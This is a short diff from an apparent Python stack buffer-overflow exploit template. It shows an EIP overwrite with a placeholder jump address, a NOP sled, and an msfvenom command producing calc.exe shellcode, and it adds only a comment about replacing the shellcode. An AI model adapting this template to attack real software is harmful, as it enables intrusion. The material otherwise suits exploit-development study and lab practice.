@@ -17,6 +17,7 @@ new_eip = struct.pack("<I", <jmp call>)
 nop_sled = b"\x90"*16
 
 # For best practice: use thread to enter and exit without crashing the application
+# replace shellcode below
 # msfvenom -p windows/exec cmd=calc.exe LHOST=tun0 LPORT=8888 EXITFUNC=thread -b "\x00\x0A\x0D" -f py
 
 buf =  b""
